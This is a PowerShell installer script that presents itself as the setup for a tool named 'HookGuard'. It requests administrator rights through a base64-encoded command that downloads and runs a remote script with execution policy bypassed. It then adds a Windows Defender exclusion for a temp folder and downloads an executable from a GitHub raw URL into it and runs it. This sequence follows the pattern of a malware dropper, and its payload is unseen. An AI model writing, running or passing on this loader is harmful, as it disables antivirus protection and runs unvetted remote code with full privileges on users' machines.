param(
    [switch]$Elevated
)

$ErrorActionPreference = 'Stop'
$ProgressPreference = 'SilentlyContinue'

$ScriptUrl = 'https://raw.githubusercontent.com/burugr/HookGuard/refs/heads/main/run.ps1'
$ExeUrl = 'https://raw.githubusercontent.com/burugr/HookGuard/main/HookGuard.exe'
$WorkDir = Join-Path $env:TEMP 'HookGuard'
$Dest = Join-Path $WorkDir 'HookGuard.exe'

function Test-IsAdministrator {
    $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = [Security.Principal.WindowsPrincipal]::new($identity)
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Restart-AsAdministrator {
    Write-Host 'Requesting administrator permissions...' -ForegroundColor Yellow

    $encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(@"
`$ErrorActionPreference = 'Stop'
iex (iwr '$ScriptUrl' -UseBasicParsing)
"@))

    Start-Process -FilePath 'powershell.exe' -Verb RunAs -ArgumentList @(
        '-NoProfile',
        '-ExecutionPolicy', 'Bypass',
        '-EncodedCommand', $encodedCommand
    )
}

try {
    if (-not (Test-IsAdministrator)) {
        Restart-AsAdministrator
        return
    }

    New-Item -ItemType Directory -Path $WorkDir -Force | Out-Null

    Write-Host 'Adding Windows Defender exclusion for HookGuard...' -ForegroundColor Yellow
    try {
        Add-MpPreference -ExclusionPath $WorkDir -ErrorAction Stop
    }
    catch {
        Write-Warning "Could not add Defender exclusion: $($_.Exception.Message)"
    }

    Write-Host 'Downloading HookGuard...' -ForegroundColor Cyan
    Invoke-WebRequest -Uri $ExeUrl -OutFile $Dest -UseBasicParsing

    if (-not (Test-Path -LiteralPath $Dest)) {
        throw "Download did not create $Dest"
    }

    $fileInfo = Get-Item -LiteralPath $Dest
    if ($fileInfo.Length -le 0) {
        throw "Downloaded file is empty: $Dest"
    }

    Write-Host 'Starting HookGuard...' -ForegroundColor Green
    Start-Process -FilePath $Dest -WorkingDirectory $WorkDir
}
catch {
    Write-Error "HookGuard failed to start: $($_.Exception.Message)"
    exit 1
}
